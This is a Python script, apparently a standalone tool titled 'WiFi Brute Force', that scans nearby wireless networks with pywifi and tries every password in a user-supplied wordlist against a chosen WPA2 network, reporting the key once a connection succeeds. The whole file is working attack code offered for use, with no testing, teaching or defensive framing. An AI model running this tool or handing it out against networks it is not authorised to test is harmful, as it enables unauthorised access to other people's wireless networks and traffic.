# Only tested on Debian 12 bookworm

import os
import time
from pywifi import PyWiFi, const, Profile, const


def check_root():
    return os.geteuid() == 0


def list_interfaces():
    wifi = PyWiFi()
    interfaces = wifi.interfaces()
    print("[*] Available WiFi Interfaces:")
    for idx, iface in enumerate(interfaces):
        print(f"[{idx}] {iface.name()}")
    return interfaces


def scan_ssids(iface):
    iface.scan()
    time.sleep(2)  # Allow time for scan to complete
    scan_results = iface.scan_results()
    print("[*] Available SSIDs:")
    for idx, result in enumerate(scan_results):
        print(f"[{idx}] {result.ssid}")
    return scan_results


def main(ssid, password, iface):
    iface.disconnect()
    time.sleep(1)

    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(2)  # Allow more time for connection

    if iface.status() == const.IFACE_CONNECTED:
        return True  # Connection successful
    else:
        return False  # Connection failed


def pwd(ssid, file, iface):
    if not os.path.exists(file):
        print("[-] Password File Not Found!")
        return

    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            pwd = line.strip()  # Clean up the password
            if main(ssid, pwd, iface):
                print(f"[+] Password Found: {pwd}")
                return  # Stop further attempts when password is found
    print("[-] Password Not Found in the provided wordlist.")


def menu():
    print(r"""
 __      ___  __ _   ___          _         ___                _
 \ \    / (_)/ _(_) | _ )_ _ _  _| |_ ___  | __|__ _ _ __ ___  _
  \ \/\/ /| |  _| | | _ \ '_| || |  _/ -_) | _/ _ \ '_/ _/ -_)
   \_/\_/ |_|_| |_| |___/_|  \_,_|\__\___| |_|\___/_| \__\___|

<--------------------------------------------------------------->""")
    interfaces = list_interfaces()
    if not interfaces:
        print("[-] No WiFi interfaces found!")
        return

    try:
        interface_index = int(input("[*] Select WiFi Interface Number: "))
        iface = interfaces[interface_index]
    except (ValueError, IndexError):
        print("[-] Invalid interface selection!")
        return

    scan_results = scan_ssids(iface)
    if not scan_results:
        print("[-] No SSIDs found!")
        return

    try:
        ssid_choice = input(
            "[*] Do you want to select from the list or enter a hidden SSID? (list/hidden): ").strip().lower()
        if ssid_choice == 'list':
            ssid_index = int(input("[*] Select SSID Number: "))
            ssid = scan_results[ssid_index].ssid
        elif ssid_choice == 'hidden':
            ssid = input("[*] Enter the hidden SSID: ").strip()
        else:
            print("[-] Invalid choice!")
            return
    except (ValueError, IndexError):
        print("[-] Invalid SSID selection!")
        return

    file = input("[*] Passwords File: ")  # File path containing passwords

    if not os.path.exists(file):
        print("[-] File Not Found!")
        return

    print("[~] Cracking in background...")
    pwd(ssid, file, iface)


if __name__ == "__main__":
    if not check_root():
        print("The script needs to run with sufficient permissions to interact with the WiFi interface. You might need to run the script with sudo")
    menu()
    print("[*] Exiting...")
